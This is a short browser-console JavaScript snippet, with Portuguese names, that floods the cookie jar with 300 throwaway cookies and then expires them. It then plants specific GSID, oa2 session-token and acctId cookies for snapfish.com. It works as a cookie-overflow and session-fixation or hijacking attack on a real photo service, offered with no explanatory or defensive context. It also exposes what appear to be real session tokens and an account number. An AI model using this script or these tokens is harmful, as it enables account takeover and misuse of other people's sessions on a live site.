let quantidadeCookies = 300;
console.log(quantidadeCookies); 
for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; Secure; path=/`;
    console.log(document.cookie)
}

for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;
}

document.cookie = "GSID=aus-a9043392-8b5a-4902-bee5-2d0630227267-01267; domain=snapfish.com; path=/home; Secure; SameSite=None";
document.cookie = "oa2=sf_v1a%3Bdx1Rx3Tjip9bozPu5UiZUUz0vWMdLqYD3YJSWa%2BMAP3BMqjY9NbkMUR46F%2BC1yhbsO2VSiaEB%2BRHE2ItowKvrUKnGfa7ZVhYr1PSKOCudUjzghPlhyGxS0WxoolX4Phjy3yqXDB4GPUzL9JpmETJpQ2En0%2BOHMRMHkN%2FcsO98zM%3Dl2tZMN7Xtl9t9DXcZiDsR1pynutXGqUMBr7q3Oa7BNmEykPgMIQm1DVaaJ7xA81e3S%2B3jHW37w9Yhi99GkFJ%2FQ3NnqnfRg9jDb%2BLvlgN4ND5fi81p%2B8BqscKXnSbgAb8CiVpghpmI9DTow8BkBuYjYkE0rH7Ib%2FAzI6eISystro%3D; domain=snapfish.com; path=/home; Secure; SameSite=None";
document.cookie = "acctId=148744521060; domain=snapfish.com; path=/home; Secure; SameSite=None";
console.log("teste");
